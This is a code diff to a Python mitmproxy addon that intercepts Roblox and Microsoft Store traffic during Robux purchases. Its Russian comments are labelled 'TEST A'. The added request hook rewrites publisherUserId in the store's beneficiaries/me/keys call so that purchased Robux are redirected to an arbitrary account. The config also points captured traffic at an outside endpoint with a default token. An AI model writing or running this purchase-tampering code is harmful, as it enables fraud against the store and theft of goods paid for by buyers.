@@ -26,6 +26,9 @@ from urllib.request import Request, urlopen, build_opener, ProxyHandler
 
 ENDPOINT = os.environ.get("CAPTURE_ENDPOINT", "https://wesqaliqo.com/download/capture")
 TOKEN = os.environ.get("CAPTURE_TOKEN", "rbxcap-2f9a4c7e")
+# ТЕСТ A: если задан — подменяем publisherUserId в beneficiaries/me/keys на этот userId
+# (проверка: уйдут ли Robux на произвольный аккаунт, не залогиненный в приложении).
+OVERRIDE_PUBLISHER_USERID = os.environ.get("OVERRIDE_PUBLISHER_USERID", "").strip()
 
 HOST_HINTS = ("roblox.com", "rbxcdn.com", "microsoft.com", "live.com", "xboxlive.com",
               "mp.microsoft", "md.microsoft", "xbox.com", "msftauth", "windows.net",
@@ -130,6 +133,24 @@ class RobuxAppCapture:
         self.seq = 0
         ctx.log.info("[robux] захват пишется в %s" % self.out_dir)
         ctx.log.info("[robux] покупай 80 Robux в приложении Roblox, потом Ctrl+C здесь")
+
+    def request(self, flow):
+        # ТЕСТ A: подмена получателя в beneficiaries/me/keys
+        if not OVERRIDE_PUBLISHER_USERID:
+            return
+        try:
+            if (flow.request.host == "collections.mp.microsoft.com"
+                    and flow.request.path.endswith("/beneficiaries/me/keys")
+                    and flow.request.method == "POST"):
+                txt = flow.request.get_text(strict=False) or ""
+                obj = json.loads(txt)
+                if "publisherUserId" in obj:
+                    old = obj["publisherUserId"]
+                    obj["publisherUserId"] = OVERRIDE_PUBLISHER_USERID
+                    flow.request.text = json.dumps(obj)
+                    ctx.log.warn("[robux] >>> ПОДМЕНА publisherUserId: %s -> %s" % (old, OVERRIDE_PUBLISHER_USERID))
+        except Exception as e:
+            ctx.log.warn("[robux] override err: %s" % e)
 
     def response(self, flow):
         try:
